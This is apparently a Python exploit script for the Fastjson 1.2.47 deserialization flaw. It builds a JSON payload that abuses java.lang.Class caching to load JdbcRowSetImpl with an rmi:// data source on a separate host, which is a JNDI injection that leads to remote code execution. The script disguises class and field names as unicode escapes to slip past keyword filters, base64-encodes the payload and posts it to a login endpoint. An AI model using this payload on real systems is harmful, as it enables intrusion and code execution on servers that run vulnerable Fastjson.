"""
fastjson 1.2.47
"""

import re

import requests
from sqlalchemy.util import b64encode

txt = """{
  "1": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "2": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://192.168.50.161:1099/ytecfe",
    "autoCommit": true
  }
}
"""
pattern = "JdbcRowSetImpl|type|dataSourceName|autoCommit|TemplatesImpl|bytecodes|BasicDataSource"
p = re.compile(pattern)


def get_unicode(txt):
    return ''.join([f"\\u{ord(x):04x}" for x in txt])


def repl(match: re.Match):
    return get_unicode(match.group())


res = p.sub(repl, txt)
print(res)
payload = b64encode(res.encode())
print(payload)
requests.post('http://127.0.0.1:8081/login', data={'data': payload})
